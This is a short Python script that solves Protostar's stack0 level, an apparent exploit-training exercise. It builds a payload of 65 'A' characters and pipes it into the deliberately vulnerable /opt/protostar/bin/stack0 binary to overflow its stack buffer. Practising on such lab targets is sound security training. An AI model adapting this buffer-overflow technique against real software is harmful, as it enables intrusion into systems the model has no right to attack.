#!/usr/bin/python

import os
import struct

payload =  "A" * 0x41

os.system("echo \"%s\" | /opt/protostar/bin/stack0" % payload)
